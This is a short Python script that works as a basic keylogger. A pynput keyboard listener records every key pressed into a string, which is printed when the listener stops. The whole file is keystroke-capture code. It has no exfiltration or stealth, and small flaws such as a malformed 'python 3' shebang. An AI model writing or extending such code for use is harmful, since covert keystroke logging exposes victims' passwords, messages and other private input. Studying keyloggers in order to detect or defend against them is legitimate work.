#!/usr/bin/env python 3
import pynput.keyboard 

log = ""

def process_key_press(key):
	global log
	log += str(key)


key_listen = pynput.keyboard.Listener(on_press=process_key_press)
with key_listen:
	key_listen.join()
print(log)

